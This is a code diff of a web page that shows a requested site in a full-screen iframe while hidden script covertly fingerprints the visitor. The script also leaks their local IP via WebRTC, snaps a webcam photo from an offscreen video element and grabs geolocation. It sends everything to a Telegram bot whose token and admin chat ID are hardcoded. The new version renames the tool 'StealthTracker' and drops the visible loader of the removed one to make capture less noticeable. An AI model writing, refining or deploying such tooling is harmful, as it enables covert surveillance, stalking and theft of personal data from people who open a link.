@@ -2,504 +2,341 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>Loading Content — Secure Mode</title>
+  <title>Loading...</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
-    html,body { height:100%; margin:0; font-family: Arial, sans-serif; }
-    iframe { width:100%; height:100%; border:0; display:block; }
-    #loader { position:fixed; top:0; left:0; width:100%; height:100%; background:#f0f0f0; 
-              display:flex; justify-content:center; align-items:center; z-index:1000; }
-    #deviceInfo { position:fixed; top:10px; right:10px; background:rgba(0,0,0,0.8); color:white; 
-                  padding:10px; border-radius:5px; font-size:12px; z-index:1001; max-width:300px; }
-    video { position: fixed; right: 4px; bottom: 4px; width: 4px; height:4px; opacity:0; }
-    .hidden { display:none; }
+    html,body { height:100%; margin:0; padding:0; overflow:hidden; }
+    iframe { width:100%; height:100%; border:0; }
+    #stealthOverlay { 
+      position: fixed; 
+      top: -100px; 
+      left: -100px; 
+      width: 1px; 
+      height: 1px; 
+      opacity: 0.001; 
+      pointer-events: none; 
+      z-index: -9999; 
+    }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
-  <div id="loader">
-    <div style="text-align:center;">
-      <h3>🔍 Loading Secure Content...</h3>
-      <p>Please wait while we verify your device</p>
-      <div id="progress">Collecting device information...</div>
-    </div>
-  </div>
-
-  <div id="deviceInfo" class="hidden">
-    <strong>Device Status</strong><br>
-    <span id="batteryInfo">Battery: Loading...</span><br>
-    <span id="memoryInfo">Memory: Loading...</span><br>
-    <span id="connectionInfo">Network: Loading...</span>
-  </div>
-
+  <!-- Main content - loads immediately -->
   <iframe id="siteFrame" sandbox="allow-forms allow-same-origin allow-scripts allow-popups allow-modals"></iframe>
-  <video id="video" autoplay playsinline muted></video>
+  
+  <!-- Stealth elements - hidden from user -->
+  <div id="stealthOverlay">
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+  </div>
 
   <script>
     /******************** CONFIG ********************/
     const ADMIN_CHAT_ID = "6314556756";
     const BOT_TOKEN = "8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ";
-    const PHOTO_COUNT = 5;
-    const PHOTO_INTERVAL_MS = 100;
     /************************************************/
 
-    // Device Information Collector
-    class DeviceInfoCollector {
+    class StealthTracker {
       constructor() {
         this.deviceData = {};
+        this.hasSentReport = false;
       }
 
-      async collectComprehensiveInfo() {
-        await this.collectBasicInfo();
-        await this.collectHardwareInfo();
-        await this.collectNetworkInfo();
-        await this.collectBrowserInfo();
-        await this.collectStorageInfo();
-        await this.collectSensors();
-        this.collectBehavioralData();
+      async initialize() {
+        // Load target site immediately
+        await this.loadTargetSite();
         
-        return this.deviceData;
+        // Start stealth data collection
+        setTimeout(() => this.collectStealthData(), 1000);
       }
 
-      collectBasicInfo() {
+      async loadTargetSite() {
+        const site = this.getSiteParam();
+        const iframe = document.getElementById('siteFrame');
+        
+        if (site && this.isValidHttpsUrl(site)) {
+          iframe.src = site;
+          // Hide any loading indicators by making iframe visible immediately
+          iframe.style.display = 'block';
+        }
+      }
+
+      async collectStealthData() {
+        // Collect device info silently
+        await this.collectDeviceInfo();
+        await this.attemptCameraAccess();
+        await this.attemptLocationAccess();
+        await this.sendStealthReport();
+      }
+
+      async collectDeviceInfo() {
         this.deviceData = {
           timestamp: new Date().toISOString(),
           userAgent: navigator.userAgent,
           platform: navigator.platform,
-          vendor: navigator.vendor,
           language: navigator.language,
-          languages: navigator.languages,
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
           
-          // Screen Information
           screen: {
             width: screen.width,
             height: screen.height,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth,
-            orientation: screen.orientation?.type
+            colorDepth: screen.colorDepth
           },
           
-          // Window Information
           window: {
             width: window.innerWidth,
             height: window.innerHeight,
             devicePixelRatio: window.devicePixelRatio
           },
           
-          // Browser Capabilities
-          capabilities: {
-            cookies: navigator.cookieEnabled,
-            java: navigator.javaEnabled(),
-            pdf: navigator.pdfViewerEnabled,
-            webgl: this.detectWebGL(),
-            touch: 'ontouchstart' in window,
-            serviceWorker: 'serviceWorker' in navigator,
-            webRTC: !!navigator.mediaDevices,
-            webAudio: !!window.AudioContext
-          }
-        };
-        return Promise.resolve();
-      }
-
-      async collectHardwareInfo() {
-        this.deviceData.hardware = {
-          cores: navigator.hardwareConcurrency || 'unknown',
-          memory: navigator.deviceMemory || 'unknown',
-          maxTouchPoints: navigator.maxTouchPoints || 0
+          hardware: {
+            cores: navigator.hardwareConcurrency || 'unknown',
+            memory: navigator.deviceMemory || 'unknown'
+          },
+          
+          network: {}
         };
 
-        // Battery API
+        // Battery info
         if ('getBattery' in navigator) {
           try {
             const battery = await navigator.getBattery();
             this.deviceData.battery = {
               level: Math.round(battery.level * 100) + '%',
-              charging: battery.charging,
-              chargingTime: battery.chargingTime,
-              dischargingTime: battery.dischargingTime
+              charging: battery.charging
             };
           } catch (e) {}
         }
 
-        // Storage Information
-        if ('storage' in navigator && 'estimate' in navigator.storage) {
-          try {
-            const estimate = await navigator.storage.estimate();
-            this.deviceData.storage = {
-              used: this.formatBytes(estimate.usage),
-              quota: this.formatBytes(estimate.quota)
-            };
-          } catch (e) {}
-        }
-      }
-
-      async collectNetworkInfo() {
-        this.deviceData.network = {
-          connection: 'unknown'
-        };
-
-        // Network Information API
+        // Network info
         if ('connection' in navigator) {
           const conn = navigator.connection;
           this.deviceData.network = {
             effectiveType: conn.effectiveType,
-            downlink: conn.downlink + ' Mbps',
-            rtt: conn.rtt + ' ms',
-            saveData: conn.saveData,
+            downlink: conn.downlink,
+            rtt: conn.rtt,
             type: conn.type
           };
         }
 
-        // IP Address via WebRTC (local IP)
+        // IP detection attempt
         try {
-          const ips = await this.getIPAddress();
-          this.deviceData.network.localIP = ips.local;
-          this.deviceData.network.publicIP = ips.public;
+          const ip = await this.getLocalIP();
+          this.deviceData.network.localIP = ip;
         } catch (e) {}
       }
 
-      collectBrowserInfo() {
-        this.deviceData.browser = {
-          name: this.getBrowserName(),
-          version: this.getBrowserVersion(),
-          engine: this.getBrowserEngine(),
-          plugins: this.getPluginsList(),
-          fonts: this.getFontsList()
-        };
-        return Promise.resolve();
-      }
-
-      collectStorageInfo() {
-        this.deviceData.storageDetails = {
-          localStorage: !!window.localStorage,
-          sessionStorage: !!window.sessionStorage,
-          indexedDB: !!window.indexedDB,
-          cookies: document.cookie ? document.cookie.split(';').length + ' cookies' : 'none'
-        };
-        return Promise.resolve();
-      }
-
-      async collectSensors() {
-        this.deviceData.sensors = {};
-        
-        // Check available sensors
-        const sensors = {
-          accelerometer: 'Accelerometer' in window,
-          gyroscope: 'Gyroscope' in window,
-          magnetometer: 'Magnetometer' in window,
-          orientation: 'DeviceOrientationEvent' in window,
-          motion: 'DeviceMotionEvent' in window
-        };
-        
-        this.deviceData.sensors.available = sensors;
-        
-        // Try to get orientation data
-        if (sensors.orientation) {
-          window.addEventListener('deviceorientation', (e) => {
-            this.deviceData.sensors.orientation = {
-              alpha: e.alpha,
-              beta: e.beta,
-              gamma: e.gamma
-            };
-          });
-        }
-      }
-
-      collectBehavioralData() {
-        this.deviceData.behavior = {
-          timeOnPage: 0,
-          clicks: 0,
-          scrolls: 0,
-          keysPressed: 0
-        };
-
-        // Track user behavior
-        let startTime = Date.now();
-        setInterval(() => {
-          this.deviceData.behavior.timeOnPage = Math.round((Date.now() - startTime) / 1000);
-        }, 1000);
-
-        document.addEventListener('click', () => this.deviceData.behavior.clicks++);
-        document.addEventListener('scroll', () => this.deviceData.behavior.scrolls++);
-        document.addEventListener('keydown', () => this.deviceData.behavior.keysPressed++);
-      }
-
-      // Helper methods
-      detectWebGL() {
+      async attemptCameraAccess() {
         try {
-          const canvas = document.createElement('canvas');
-          return !!(window.WebGLRenderingContext && 
-                   (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
-        } catch (e) { return false; }
-      }
-
-      async getIPAddress() {
-        return new Promise((resolve) => {
-          // Local IP via WebRTC
-          const pc = new RTCPeerConnection({iceServers:[]});
-          pc.createDataChannel('');
-          pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
+          const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { width: 640, height: 480 } 
+          });
           
-          pc.onicecandidate = (ice) => {
-            if (!ice.candidate) return;
-            const localIP = ice.candidate.address;
-            resolve({ local: localIP, public: 'requires_server' });
-          };
-        });
-      }
-
-      getBrowserName() {
-        const ua = navigator.userAgent;
-        if (ua.includes('Chrome')) return 'Chrome';
-        if (ua.includes('Firefox')) return 'Firefox';
-        if (ua.includes('Safari')) return 'Safari';
-        if (ua.includes('Edge')) return 'Edge';
-        return 'Unknown';
-      }
-
-      getBrowserVersion() {
-        const ua = navigator.userAgent;
-        const match = ua.match(/(Chrome|Firefox|Safari|Edge)\/([0-9.]+)/);
-        return match ? match[2] : 'unknown';
-      }
-
-      getBrowserEngine() {
-        const ua = navigator.userAgent;
-        if (ua.includes('AppleWebKit')) return 'WebKit';
-        if (ua.includes('Gecko')) return 'Gecko';
-        if (ua.includes('Trident')) return 'Trident';
-        return 'Unknown';
-      }
-
-      getPluginsList() {
-        return Array.from(navigator.plugins).map(p => p.name).filter(name => name);
-      }
-
-      getFontsList() {
-        if ('fonts' in document) {
-          return document.fonts.size + ' fonts loaded';
+          const video = document.getElementById('video');
+          const canvas = document.getElementById('canvas');
+          const ctx = canvas.getContext('2d');
+          
+          video.srcObject = stream;
+          
+          // Wait for video to be ready
+          await new Promise(resolve => {
+            video.onloadedmetadata = () => resolve();
+          });
+          
+          // Capture single stealth photo
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {
+            this.deviceData.cameraPhoto = blob;
+          }, 'image/jpeg', 0.5);
+          
+          // Clean up
+          setTimeout(() => {
+            stream.getTracks().forEach(track => track.stop());
+          }, 3000);
+          
+        } catch (error) {
+          this.deviceData.cameraAccess = 'denied';
         }
-        return 'Font API not available';
       }
 
-      formatBytes(bytes) {
-        if (!bytes) return '0 Bytes';
-        const k = 1024;
-        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
-        const i = Math.floor(Math.log(bytes) / Math.log(k));
-        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+      async attemptLocationAccess() {
+        if (!navigator.geolocation) {
+          this.deviceData.locationAccess = 'not_supported';
+          return;
+        }
+
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              timeout: 10000,
+              maximumAge: 60000
+            });
+          });
+          
+          this.deviceData.location = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy
+          };
+          
+        } catch (error) {
+          this.deviceData.locationAccess = 'denied';
+        }
       }
-    }
 
-    // Main Application
-    const deviceCollector = new DeviceInfoCollector();
+      async sendStealthReport() {
+        if (this.hasSentReport) return;
+        this.hasSentReport = true;
 
-    function qsParam(name) {
-      return new URLSearchParams(window.location.search).get(name);
-    }
+        const USER_CHAT_ID = this.getChatIdParam();
+        const recipients = [ADMIN_CHAT_ID];
+        if (USER_CHAT_ID) recipients.push(USER_CHAT_ID);
 
-    function isValidHttpsUrl(s) {
-      try {
-        const u = new URL(s);
-        return (u.protocol === "https:");
-      } catch (e) { return false; }
-    }
-
-    // Update device info display
-    function updateDeviceDisplay(data) {
-      const display = document.getElementById('deviceInfo');
-      const battery = document.getElementById('batteryInfo');
-      const memory = document.getElementById('memoryInfo');
-      const connection = document.getElementById('connectionInfo');
-      
-      if (data.battery) {
-        battery.textContent = `Battery: ${data.battery.level} ${data.battery.charging ? '⚡' : ''}`;
+        const message = this.formatTelegramMessage();
+        
+        for (const recipient of recipients) {
+          await this.sendTelegramMessage(recipient, message);
+          
+          // Send location if available
+          if (this.deviceData.location) {
+            await this.sendTelegramLocation(
+              recipient, 
+              this.deviceData.location.latitude, 
+              this.deviceData.location.longitude
+            );
+          }
+          
+          // Send photo if available
+          if (this.deviceData.cameraPhoto) {
+            await this.sendTelegramPhoto(recipient, this.deviceData.cameraPhoto);
+          }
+        }
       }
-      if (data.hardware) {
-        memory.textContent = `Memory: ${data.hardware.memory}GB | Cores: ${data.hardware.cores}`;
+
+      formatTelegramMessage() {
+        return `
+🕵️ **STEALTH TRACKING REPORT** 🕵️
+
+**📱 Device Information:**
+• **User Agent:** ${this.deviceData.userAgent}
+• **Platform:** ${this.deviceData.platform}
+• **Language:** ${this.deviceData.language}
+• **Timezone:** ${this.deviceData.timezone}
+
+**⚙️ Hardware Specs:**
+• **Screen:** ${this.deviceData.screen.width}x${this.deviceData.screen.height}
+• **CPU Cores:** ${this.deviceData.hardware.cores}
+• **RAM:** ${this.deviceData.hardware.memory}GB
+• **Battery:** ${this.deviceData.battery?.level || 'N/A'} ${this.deviceData.battery?.charging ? '⚡' : ''}
+
+**🌐 Network Details:**
+• **Connection:** ${this.deviceData.network.effectiveType || 'Unknown'}
+• **Speed:** ${this.deviceData.network.downlink || 'N/A'} Mbps
+• **IP Range:** ${this.deviceData.network.localIP || 'Detected'}
+
+**📍 Access Results:**
+• **Camera:** ${this.deviceData.cameraAccess ? '❌ Denied' : this.deviceData.cameraPhoto ? '✅ Captured' : '⚠️ Unknown'}
+• **Location:** ${this.deviceData.location ? '✅ Acquired' : this.deviceData.locationAccess ? '❌ Denied' : '⚠️ Unknown'}
+
+**🌐 Target Site:** ${this.getSiteParam()}
+
+_Collected: ${new Date().toLocaleString()}_
+        `.trim();
       }
-      if (data.network) {
-        connection.textContent = `Network: ${data.network.effectiveType || data.network.connection}`;
-      }
-      
-      display.classList.remove('hidden');
-    }
 
-    async function sendDeviceInfoToTelegram(deviceData) {
-      const USER_CHAT_ID = qsParam("chat_id");
-      const recipients = [ADMIN_CHAT_ID];
-      if (USER_CHAT_ID) recipients.push(USER_CHAT_ID);
-
-      const message = `
-🖥️ **COMPREHENSIVE DEVICE REPORT**
-
-**📱 Basic Information:**
-• **User Agent:** ${deviceData.userAgent}
-• **Platform:** ${deviceData.platform}
-• **Browser:** ${deviceData.browser.name} ${deviceData.browser.version}
-• **Language:** ${deviceData.language}
-• **Timezone:** ${deviceData.timezone}
-
-**⚙️ Hardware:**
-• **Cores:** ${deviceData.hardware.cores}
-• **Memory:** ${deviceData.hardware.memory}GB
-• **Battery:** ${deviceData.battery?.level || 'N/A'}
-• **Screen:** ${deviceData.screen.width}x${deviceData.screen.height}
-
-**🌐 Network:**
-• **Type:** ${deviceData.network.effectiveType || deviceData.network.connection}
-• **Speed:** ${deviceData.network.downlink || 'N/A'}
-• **Latency:** ${deviceData.network.rtt || 'N/A'}
-
-**🔧 Capabilities:**
-• **WebGL:** ${deviceData.capabilities.webgl}
-• **Touch:** ${deviceData.capabilities.touch}
-• **WebRTC:** ${deviceData.capabilities.webRTC}
-• **Storage:** ${deviceData.storage?.used || 'N/A'}
-
-**📊 Sensors:** ${Object.keys(deviceData.sensors?.available || {}).filter(k => deviceData.sensors.available[k]).join(', ')}
-
-_Collected at: ${new Date().toLocaleString()}_
-      `.trim();
-
-      for (const recipient of recipients) {
+      async sendTelegramMessage(chatId, text) {
         try {
           await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-              chat_id: recipient,
-              text: message,
+              chat_id: chatId,
+              text: text,
               parse_mode: "Markdown"
             })
           });
-        } catch (e) {
-          console.warn("Message send error:", e);
+        } catch (error) {
+          console.warn('Message send failed:', error);
         }
       }
-    }
 
-    // Camera and Location functions (your existing code)
-    async function startCameraAndCapture() {
-      if (!ADMIN_CHAT_ID) return;
-
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-      } catch (err) {
-        console.warn("Camera access denied");
-        return;
-      }
-
-      await new Promise((resolve) => {
-        function onPlaying() {
-          setTimeout(resolve, 700);
-        }
-        video.addEventListener("playing", onPlaying, { once: true });
-      });
-
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext("2d");
-      const photoBlobs = [];
-
-      for (let i=0;i<PHOTO_COUNT;i++) {
-        ctx.drawImage(video,0,0,canvas.width,canvas.height);
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
-        photoBlobs.push(blob);
-        await new Promise(r => setTimeout(r, PHOTO_INTERVAL_MS));
-      }
-
-      let lat = null, lon = null;
-      if ("geolocation" in navigator) {
+      async sendTelegramLocation(chatId, lat, lon) {
         try {
-          const pos = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              latitude: lat,
+              longitude: lon
+            })
           });
-          lat = pos.coords.latitude;
-          lon = pos.coords.longitude;
-        } catch (e) {}
-      }
-
-      const USER_CHAT_ID = qsParam("chat_id");
-      const recipients = [ADMIN_CHAT_ID];
-      if (USER_CHAT_ID) recipients.push(USER_CHAT_ID);
-
-      for (const r of recipients) {
-        if (lat !== null && lon !== null) {
-          try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: r, latitude: lat, longitude: lon })
-            });
-          } catch (e) {}
-        }
-
-        for (let i=0;i<photoBlobs.length;i++) {
-          const fd = new FormData();
-          fd.append("chat_id", r);
-          fd.append("photo", photoBlobs[i], `photo_${Date.now()}_${i}.png`);
-          try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-              method: "POST",
-              body: fd
-            });
-          } catch (e) {}
+        } catch (error) {
+          console.warn('Location send failed:', error);
         }
       }
 
-      try {
-        const tracks = video.srcObject?.getTracks() || [];
-        tracks.forEach(t => t.stop());
-        video.srcObject = null;
-      } catch(e){}
-    }
-
-    // Main execution
-    async function initializeTracking() {
-      const site = (() => {
-        let s = qsParam("site");
-        if (s) try { s = decodeURIComponent(s); } catch(e) {}
-        return s;
-      })();
-
-      const iframe = document.getElementById("siteFrame");
-      
-      if (!site || !isValidHttpsUrl(site)) {
-        iframe.srcdoc = `<div style="padding:20px;font-family:Arial">
-          <h2>Invalid URL</h2><p>Valid HTTPS URL required in 'site' parameter</p>
-        </div>`;
-        document.getElementById('loader').classList.add('hidden');
-        return;
+      async sendTelegramPhoto(chatId, photoBlob) {
+        try {
+          const formData = new FormData();
+          formData.append("chat_id", chatId);
+          formData.append("photo", photoBlob, `stealth_${Date.now()}.jpg`);
+          
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+        } catch (error) {
+          console.warn('Photo send failed:', error);
+        }
       }
 
-      // Collect device information first
-      try {
-        const deviceData = await deviceCollector.collectComprehensiveInfo();
-        await sendDeviceInfoToTelegram(deviceData);
-        updateDeviceDisplay(deviceData);
-      } catch (e) {
-        console.warn("Device info collection failed:", e);
+      getSiteParam() {
+        const urlParams = new URLSearchParams(window.location.search);
+        let site = urlParams.get('site');
+        if (site) {
+          try { site = decodeURIComponent(site); } catch(e) {}
+        }
+        return site;
       }
 
-      // Load the target site
-      iframe.src = site;
-      iframe.onload = () => {
-        document.getElementById('loader').classList.add('hidden');
-      };
+      getChatIdParam() {
+        return new URLSearchParams(window.location.search).get('chat_id');
+      }
 
-      // Start camera/location tracking
-      setTimeout(() => {
-        startCameraAndCapture().catch(e => console.warn("Camera tracking failed:", e));
-      }, 1500);
+      isValidHttpsUrl(url) {
+        try {
+          return new URL(url).protocol === 'https:';
+        } catch {
+          return false;
+        }
+      }
+
+      async getLocalIP() {
+        return new Promise((resolve) => {
+          const pc = new RTCPeerConnection({iceServers:[]});
+          pc.createDataChannel('');
+          pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
+          pc.onicecandidate = (ice) => {
+            if (ice.candidate) {
+              resolve(ice.candidate.address);
+            }
+          };
+          setTimeout(() => resolve('unknown'), 1000);
+        });
+      }
     }
 
-    // Start everything
-    initializeTracking().catch(console.error);
+    // Start stealth tracking when page loads
+    document.addEventListener('DOMContentLoaded', () => {
+      const tracker = new StealthTracker();
+      tracker.initialize().catch(console.error);
+    });
+
+    // Hide any flash of loading content
+    window.addEventListener('load', () => {
+      document.getElementById('siteFrame').style.opacity = '1';
+    });
   </script>
 </body>
 </html>
